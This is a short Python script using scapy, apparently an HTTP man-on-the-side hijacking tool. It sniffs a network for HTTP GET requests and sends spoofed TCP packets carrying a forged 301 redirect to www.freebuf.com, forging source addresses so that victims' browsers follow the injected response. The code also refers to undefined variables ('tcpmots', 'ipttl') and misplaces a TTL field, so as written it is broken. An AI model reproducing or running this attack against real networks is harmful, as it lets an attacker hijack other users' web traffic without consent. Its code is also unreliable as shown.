#coding:utf-8
 
'''
name:http mots attack
date:2017-07-11
author:feiniao
Version:1.0
'''

from scapy.all import *
import random

'''
1、windows绑定本机网卡,首先使用show_interfaces()查看相关网卡
2、再使用conf.iface=''绑定相应的网卡
3、linux需要在sniff()中指定相应的网卡

'''
conf.iface='Intel(R) Dual Band Wireless-AC 8260'

ipid = random.randint(1,65535)
tcpseq = random.randint(1,4294967295)

data = "HTTP/1.0 301 Moved Permanently\r\n"
data += "Server: Apache/1.3.17 (Unix) PHP/4.0.4\r\n"
data += "Location: http://www.freebuf.com\r\n"
data += "Content-Type: text/html; charset=iso-8859-1\r\n"
data += "Connection: close\r\n"
data += "\r\n"

def buying(httpmots):
	resp = Ether()/IP()/TCP()/data

	#构造TCP相关字段
	resp[TCP].dport = httpmots[TCP].sport
	resp[TCP].sport = httpmots[TCP].dport
	resp[TCP].ttl = tcpmots[TCP].ttl
	resp[TCP].seq = httpmots[TCP].ack
	resp[TCP].ack = httpmots[TCP].seq + len(httpmots[TCP].load)
	resp[TCP].flags = "A"
	resp[TCP].window = 12345
	
	#构造IP包头
	resp[IP].src = httpmots[IP].dst
	resp[IP].dst = httpmots[IP].src
	resp[IP].ttl = ipttl
	resp[IP].id  = ipid

	#构造以太网包头
	resp[Ether].src = httpmots[Ether].dst
	resp[Ether].dst = httpmots[Ether].src

	#发送构造的TCP DOS 包
	sendp(resp,count=1)
	print("HTTP劫持",resp[IP].src,"成功")
	
if __name__ == '__main__':
	#过滤HTTP的GET请求
	sniff(prn=buying,filter='tcp[((tcp[12:1]&0xf0)>>2):4]=0x47455420 and not host www.freebuf.com') 
